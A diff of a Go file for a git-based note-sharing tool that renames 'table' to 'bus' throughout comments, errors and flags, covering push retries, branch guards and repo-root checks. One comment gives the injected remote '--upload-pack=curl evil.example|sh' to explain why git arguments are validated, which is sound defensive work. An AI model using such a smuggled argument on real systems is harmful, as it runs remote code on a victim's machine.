@@ -17,7 +17,7 @@ import (
 
 // The push protocol.
 //
-// The table this replaces lost notes for one reason: the transport was `git push` typed by
+// The bus this replaces lost notes for one reason: the transport was `git push` typed by
 // hand, and a push refused because someone else pushed first was a person's problem. On the
 // night the issue records, one line rebased by hand every time and another simply lost its
 // push. So the retry is INSIDE the tool, and a rejected push never reaches a person.
@@ -32,7 +32,7 @@ import (
 //
 // A `git push` publishes the whole BRANCH, not the commit just made, so a checkout
 // already carrying commits this tool did not make would publish those too -- somebody
-// else's half-finished work, sent to the table under a note's name. EnsureLevelWith is
+// else's half-finished work, sent to the bus under a note's name. EnsureLevelWith is
 // the guard: before anything is staged, the branch must be level with the remote, and if
 // it is not, the run refuses and names the count. That is why the loop above says
 // "commits" rather than "commit": once the guard has passed there is exactly one, and the
@@ -77,7 +77,7 @@ func (g *gitError) Error() string {
 // -- the branch-ahead refusal, the retry budget, the lock -- is downstream of a subprocess
 // that returns. A tool a person is waiting on that has stopped saying anything is
 // indistinguishable from a tool that is working, which is the same shape as every other
-// silence this file exists to end. Sixty seconds is a fetch of a table's whole history on
+// silence this file exists to end. Sixty seconds is a fetch of a bus's whole history on
 // a slow link and far more than any local call; --git-timeout moves it.
 const DefaultGitTimeout = 60 * time.Second
 
@@ -151,7 +151,7 @@ func git(dir string, args ...string) (string, error) {
 // These two flags are pasted onto a `git fetch` and a `git push` command line. Without
 // this, a --remote of "--upload-pack=curl evil.example|sh" is not a remote at all, it is
 // an option to git, and the tool would run it. The charset is deliberately narrower than
-// what git itself accepts for a refname -- a table's remote is "origin" and its branch is
+// what git itself accepts for a refname -- a bus's remote is "origin" and its branch is
 // "main" -- because the cost of being narrow is a refusal a person reads and the cost of
 // being wide is a shell.
 //
@@ -180,7 +180,7 @@ func ValidGitArg(what, s string) error {
 // EnsureLevelWith fetches the remote branch and refuses when this checkout is AHEAD of it.
 //
 // The failure it closes is silent and large: `git push` publishes a branch, so a send from
-// a checkout holding three unrelated local commits would put all three on the table under
+// a checkout holding three unrelated local commits would put all three on the bus under
 // the note's push. That is somebody else's unfinished work published by a tool they did
 // not run, and no output line said so. The count is taken BEFORE anything is staged, so
 // the refusal costs the caller nothing but the fetch.
@@ -322,26 +322,26 @@ func EnsureLevelWith(dir, remote, branch string) error {
 	return nil
 }
 
-// IsRepoRoot reports whether dir is the ROOT of a git work tree, so a table root that is
+// IsRepoRoot reports whether dir is the ROOT of a git work tree, so a bus root that is
 // merely a directory of Markdown is refused with that as the reason rather than with
-// git's -- and so is a table that is a SUBDIRECTORY of somebody else's repository.
+// git's -- and so is a bus that is a SUBDIRECTORY of somebody else's repository.
 //
 // THE FAILURE THIS CLOSES, which was silent and is the worst shape a failure here can
 // have. The first version asked git only `rev-parse --is-inside-work-tree`, which is true
-// anywhere under a repository. Point --table at `docs/table` inside a larger repo and
+// anywhere under a repository. Point --bus at `docs/bus` inside a larger repo and
 // every verb ran: `git diff --name-only` reports paths relative to the REPOSITORY ROOT, so
-// a new note came back as `docs/table/from-bo/x.md`, the `from-` prefix guard in
+// a new note came back as `docs/bus/from-bo/x.md`, the `from-` prefix guard in
 // ChangedSince dropped it, and `inbox --since` and `check --as` reported an EMPTY change
-// set and exited 0 over unread notes. Nothing in the output said the table had not been
-// looked at. That is precisely the lie this whole tool exists to stop, so a --table that
+// set and exited 0 over unread notes. Nothing in the output said the bus had not been
+// looked at. That is precisely the lie this whole tool exists to stop, so a --bus that
 // is not the root of its own repository is a refusal that names the root it found.
 //
-// The test is `git -C <table> rev-parse --show-toplevel` compared with --table, with
+// The test is `git -C <bus> rev-parse --show-toplevel` compared with --bus, with
 // symlinks resolved on BOTH sides -- the repo's own idiom, from `nova-check nocode
 // --staged` (SPEC.md), and it is the same test for the same reason: never a test for
 // `.git` being a directory, which is false in a linked worktree and in a submodule, both
-// of which are legitimate places to keep a table. On this platform /var is a symlink to
-// /private/var, so a --table under TMPDIR would otherwise disagree with git about its own
+// of which are legitimate places to keep a bus. On this platform /var is a symlink to
+// /private/var, so a --bus under TMPDIR would otherwise disagree with git about its own
 // name.
 func IsRepoRoot(dir string) error {
 	out, err := git(dir, "rev-parse", "--show-toplevel")
@@ -351,7 +351,7 @@ func IsRepoRoot(dir string) error {
 	top := strings.TrimSpace(out)
 	if top == "" {
 		// A bare repository answers --is-inside-work-tree with false and prints nothing
-		// here; either way there is no work tree to hold a table.
+		// here; either way there is no work tree to hold a bus.
 		return fmt.Errorf("%s is not a git work tree", dir)
 	}
 	want, err := resolved(dir)
@@ -363,7 +363,7 @@ func IsRepoRoot(dir string) error {
 		return err
 	}
 	if want != got {
-		return fmt.Errorf("%s is inside the git repository rooted at %s and is not its root; git reports changed paths relative to that root, so a table one directory down would report an empty change set over unread notes -- give --table %s, or make the table a repository of its own", dir, got, got)
+		return fmt.Errorf("%s is inside the git repository rooted at %s and is not its root; git reports changed paths relative to that root, so a bus one directory down would report an empty change set over unread notes -- give --bus %s, or make the bus a repository of its own", dir, got, got)
 	}
 	return nil
 }
@@ -386,7 +386,7 @@ func resolved(dir string) (string, error) {
 func CurrentBranch(dir string) (string, error) {
 	out, err := git(dir, "symbolic-ref", "--quiet", "--short", "HEAD")
 	if err != nil {
-		return "", errors.New("the table's checkout is not on a branch (detached HEAD)")
+		return "", errors.New("the bus's checkout is not on a branch (detached HEAD)")
 	}
 	return strings.TrimSpace(out), nil
 }
@@ -449,12 +449,12 @@ func EnsureClean(dir string, allow []string) error {
 		dirty = append(dirty, path)
 	}
 	if len(dirty) > 0 {
-		return fmt.Errorf("the table's checkout holds changes that are not this note: %s", strings.Join(dirty, ", "))
+		return fmt.Errorf("the bus's checkout holds changes that are not this note: %s", strings.Join(dirty, ", "))
 	}
 	return nil
 }
 
-// CommitOnly stages and commits without pushing. The note is NOT on the table until it is
+// CommitOnly stages and commits without pushing. The note is NOT on the bus until it is
 // pushed, and every caller of this says so in its output: pushed=false is a state, not a
 // success.
 func CommitOnly(dir string, id Identity, paths []string, message string) (PushResult, error) {
@@ -515,7 +515,7 @@ func stageAndCommit(dir string, id Identity, paths []string, message string) (st
 // capped at one second.
 //
 // The cap is what keeps the whole retry budget a person's wait rather than a schedule:
-// eight attempts is at most eight seconds of waiting on top of eight fetches, and a table
+// eight attempts is at most eight seconds of waiting on top of eight fetches, and a bus
 // where that is not enough has a problem no sleep fixes. The jitter is the load-bearing
 // half -- a fixed delay leaves two benches that collided still colliding, one delay later
 // -- and it is drawn from math/rand rather than crypto/rand deliberately: this is a
@@ -576,7 +576,7 @@ func CommitAndPush(dir string, id Identity, paths []string, message, remote, bra
 		// retry here was started by somebody else's push landing first, so the two lines
 		// are in step by construction: they fetch, rebase and push again together, and a
 		// loop with no wait in it turns one lost race into a run of them at whatever rate
-		// the machine can fetch. The wait grows with the attempt so a busy table backs
+		// the machine can fetch. The wait grows with the attempt so a busy bus backs
 		// off, and the jitter is what actually breaks the step -- two benches that sleep
 		// the same 50ms are still in step.
 		sleepBetweenAttempts(pushBackoff(attempt))
@@ -619,7 +619,7 @@ func CommitAndPush(dir string, id Identity, paths []string, message, remote, bra
 // digits, and nothing else.
 //
 // It is the same guard as ValidGitArg and it exists for the same reason. A CURSOR file is
-// an ordinary file on a shared table; anyone who can push can write one, and its contents
+// an ordinary file on a shared bus; anyone who can push can write one, and its contents
 // become a git argument. Requiring plain hex means a cursor cannot be an option to git, a
 // revision expression, or a refname that resolves somewhere surprising -- it is a commit
 // or it is a refusal. The range starts at 7 because a person editing the file by hand
@@ -697,7 +697,7 @@ func HeadCommit(dir string) (string, error) {
 //
 // This is the guard on a cursor, and the failure it closes is a quiet one. A cursor is a
 // promise that everything up to it has been read; that promise is only meaningful while
-// the commit is still on the branch. After a history rewrite -- a rebase of the table, a
+// the commit is still on the branch. After a history rewrite -- a rebase of the bus, a
 // force-push, a squash -- the commit named is either gone or on a line nobody is on, and a
 // diff taken from it reports changes that are not changes and misses notes that are. So a
 // cursor that is not an ancestor of HEAD is a REFUSAL with --full named in it, never a
@@ -760,7 +760,7 @@ const LanePathspec = ":(glob)from-*/**"
 //
 // It returns the lane files ADDED or MODIFIED since the cursor, and its cost is
 // proportional to the CHANGE rather than to the history: git walks the two trees and stops
-// at every subtree whose object id is equal on both sides, so a table of ten thousand notes
+// at every subtree whose object id is equal on both sides, so a bus of ten thousand notes
 // with one new one names one path. Every part of the command line is load-bearing:
 //
 //   - --diff-filter=AM, because a deleted note is not a new note;
@@ -769,9 +769,9 @@ const LanePathspec = ":(glob)from-*/**"
 //     renames off it is a D and an A, and the A is the one that matters;
 //   - -z, because --name-only QUOTES a path holding a space or a non-ASCII byte, and a
 //     quoted path does not match a file on disk;
-//   - the pathspec, because the table's own machinery -- a README, a CI file, the roster --
+//   - the pathspec, because the bus's own machinery -- a README, a CI file, the roster --
 //     is not a note, and reading one as a note would be a parse failure reported to every
-//     reader on the table.
+//     reader on the bus.
 func ChangedSince(dir, commit string) ([]string, error) {
 	if err := ValidCommitHex(commit); err != nil {
 		return nil, err
